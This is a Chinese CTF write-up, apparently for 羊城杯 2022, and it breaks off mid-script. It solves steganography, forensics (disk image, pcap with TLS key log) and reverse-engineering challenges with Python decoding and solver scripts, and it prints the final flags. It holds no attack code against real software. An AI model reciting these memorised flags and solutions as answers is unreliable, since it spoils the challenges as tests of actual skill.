<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/14.png" alt="14"></p>
<h3 id="where_is_secret"><a class="markdownIt-Anchor" href="#where_is_secret"></a> where_is_secret</h3>
<p>拿到附件，vig.txt的内容一眼丁真，vigenere编码（<a href="https://www.guballa.de/vigenere-solver%EF%BC%89%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8B%BF%E5%88%B0%E8%A7%A3%E5%BC%80%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%BE%97%E5%88%B0%E4%B8%80%E5%BC%A0bmp%E5%9B%BE%E7%89%87%EF%BC%8C%E7%BB%93%E5%90%88hint%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%86%99%E8%AF%BB%E5%83%8F%E7%B4%A0%E7%82%B9%E8%84%9A%E6%9C%AC">https://www.guballa.de/vigenere-solver）在线解密，拿到解开压缩包得到一张bmp图片，结合hint的脚本，写读像素点脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>)</span><br><span class="line">    imgdata = np.array(img)</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">            m = <span class="built_in">int</span>(imgdata[x][y][<span class="number">1</span>])</span><br><span class="line">            n = <span class="built_in">int</span>(imgdata[x][y][<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">str</span> = m&lt;&lt;<span class="number">8</span></span><br><span class="line">            <span class="built_in">str</span> += n</span><br><span class="line">            file.write(<span class="built_in">chr</span>(<span class="built_in">str</span>))</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decode()</span><br></pre></td></tr></table></figure>
<p>打开输出的文本，发现flag被打散在文本中，写一个字母识别脚本,懒了，没写正则。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=<span class="string">&#x27;D:\\桌面\\829962.txt&#x27;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;3&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">var = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        var += i</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>
<p>获得串flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/15.png" alt="15"></p>
<p>结合特征</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h3 id="迷失幻境"><a class="markdownIt-Anchor" href="#迷失幻境"></a> 迷失幻境</h3>
<p>打卡压缩包，是虚拟磁盘镜像，取证大师挂载，查看回收站有一个jpg和一个45文件。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/16.png" alt="16"></p>
<p>查看45文件发现PNG格式特征</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/17.png" alt="17"></p>
<p>补充文件头，然后与给的100张图片中随便选一张用stegslove里的Image combiner，获得一窜字符“Key is 可莉前来报到”，猜测可爱可莉.jpg就是加密的图片，轮番试过之后，用outguess解出flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/18.png" alt="18"></p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h3 id="躲猫猫"><a class="markdownIt-Anchor" href="#躲猫猫"></a> 躲猫猫</h3>
<p>打开题目附件，用wireshark打开，读取http报文，发现一个PNG特征格式的文件</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/19.png" alt="img"></p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/20.png" alt="img"></p>
<p>下载获得一张灰色的PNG</p>
<p>接着读报文，FTP拿到一个加密压缩包，发现key.log没有加密，查看内容，通过查询是用来解密TLS流量的。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/21.png" alt="img"></p>
<p>解密TLS流量之后获得一张JPG图片</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/22.png" alt="img"></p>
<p>内容是压缩包的解压密码。解压后的脚本是对原图的像素重计算，编写脚本恢复原图。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">image = cv2.imread(<span class="string">&quot;hide.png&quot;</span>)</span><br><span class="line">imagearray = array(image)</span><br><span class="line"> </span><br><span class="line">x,y = <span class="number">5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span>,<span class="number">6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span></span><br><span class="line"> </span><br><span class="line">h,w = <span class="number">1800</span>,<span class="number">1800</span></span><br><span class="line"> </span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1*<span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2*<span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3*<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到一张图片，一番搜索，是Maxicode码，扫描多次未成功，接着查找资料，发现猫的位置需要更替为一个中心靶标（公牛眼）</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/23.png" alt="img"></p>
<p>扫描成功！！</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/24.png" alt="img"></p>
<p>GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2>
<h3 id="bbbbutton"><a class="markdownIt-Anchor" href="#bbbbutton"></a> BBBButton</h3>
<p>输入分为两段，其中第二段是最后的flag。因为只有4个按钮，猜测与四进制有关，之后在动调的过程中也刚好发现了四进制转换后的数字。</p>
<h4 id="check1"><a class="markdownIt-Anchor" href="#check1"></a> <strong>check1</strong></h4>
<p>动调发现，check1是从一张表中得到&quot;-bl^H&quot;字符串，本质上是通过整除及取余的方式确定下标得到字符。脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> table <span class="keyword">import</span> table        <span class="comment"># 导入表</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>]</span><br><span class="line">a1 = [<span class="number">0x2d</span>,<span class="number">0x62</span>]    <span class="comment"># 14772//4</span></span><br><span class="line">a2 = [<span class="number">0x6c</span>,<span class="number">0x5e</span>]    <span class="comment"># 24740//4</span></span><br><span class="line">a3 = <span class="number">0x48</span></span><br><span class="line"><span class="comment"># 4,344,684,1024,1364,1704,2044,2384,2724,3064,3404,3744,4084,4424,4764,5104,5444,5784,6124,6464,6804,7144,7484,7824,8164,8504,8844,9184,9524,9864,10204,10544,10884,11224,11564,11904,12244,12584,12924,13264,13604,13944,14284,14624,14964,15304,15644,15984,16324,16664,17004,17344,17684,18024,18364,18704,19044,19384,19724,20064,20404,20744,21084,21424,21764,22104,22444,22784,23124,23464,23804,24144,24484,24824,25164,25504,25844,26184,26524,26864,27204,27544,27884,28224,28564</span></span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(table),<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i]==a3:</span><br><span class="line">        tt.append(i//<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># print(i,end=&#x27;,&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a1[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a1[<span class="number">1</span>]:</span><br><span class="line">        n = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;1:&#x27;,i)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a2[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a2[<span class="number">1</span>]:</span><br><span class="line">        m = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;2:&#x27;,i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = n*<span class="number">0x1c39</span>+m</span><br><span class="line"><span class="comment"># k = 0x1973a6e</span></span><br><span class="line"><span class="comment"># print(hex(k))</span></span><br><span class="line"></span><br><span class="line">m = k%<span class="number">0x1c39</span></span><br><span class="line">b = k//<span class="number">0x1c39</span></span><br><span class="line"><span class="comment"># print(hex(m))</span></span><br><span class="line"><span class="comment"># print(hex(table[4*m]),hex(table[4*m+1]),hex(table[4*m+2]),hex(table[4*m+3]))</span></span><br><span class="line"><span class="comment"># print(chr(table[4*m+1]),chr(table[4*m]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">    a = i+<span class="number">85</span>*k</span><br><span class="line">    <span class="comment"># b,c = aaa(a,0x55)</span></span><br><span class="line">    c = a//<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> c==k:</span><br><span class="line">        flag1 = a</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="comment"># 0x87366687</span></span><br></pre></td></tr></table></figure>
<p>将解出的a转化为4进制输入即可（动调按按钮真的魔鬼，不小心按错还得重头再来）</p>
<h4 id="check2"><a class="markdownIt-Anchor" href="#check2"></a> <strong>check2</strong></h4>
<p>vm混淆，opcode利用check1加密过，动调直接dump即可。然后就是喜闻乐见的手撕环节（悲</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xD7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">mem = [<span class="number">0x123</span>,<span 